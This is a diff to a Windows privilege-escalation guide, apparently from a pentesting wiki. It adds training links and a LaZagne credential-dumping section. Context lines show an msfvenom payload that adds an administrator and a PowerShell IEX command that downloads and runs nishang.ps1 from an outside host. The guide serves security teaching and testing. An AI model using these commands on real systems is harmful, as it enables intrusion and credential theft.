@@ -319,6 +319,8 @@ Other Permissions can be used to escalate privileges:\
 
 ### Services binaries weak permissions
 
+{% embed url="https://academy.hackthebox.com/module/67/section/628" %}
+
 **Check if you can modify the binary that is executed by a service** or if you have **write permissions on the folder** where the binary is located ([**DLL Hijacking**](broken-reference))**.**\
 You can get every binary that is executed by a service using **wmic** (not in system32) and check your permissions using **icacls**:
 
@@ -398,6 +400,8 @@ msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f ex
 ```
 
 ## Windows Credentials
+
+{% embed url="https://academy.hackthebox.com/module/67/section/640" %}
 
 ### Winlogon Credentials
 
@@ -732,6 +736,10 @@ Will store the credentials in `$creds` for the session. A reverse shell can now 
 ```
 Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.webClient).downloadString('http:///10.10.14.20/nishang.ps1')" -Credential $creds
 ```
+
+### LaZagne
+
+When all else fails, we can run the [LaZagne](https://github.com/AlessandroZ/LaZagne) tool in an attempt to retrieve credentials from a wide variety of software. Such software includes web browsers, chat clients, databases, email, memory dumps, various sysadmin tools, and internal password storage mechanisms (i.e., Autologon, Credman, DPAPI, LSA secrets, etc.). The tool can be used to run all modules, specific modules (such as databases), or against a particular piece of software (i.e., OpenVPN). The output can be saved to a standard text file or in JSON format. Let's take it for a spin.
 
 ## Powershell History
 
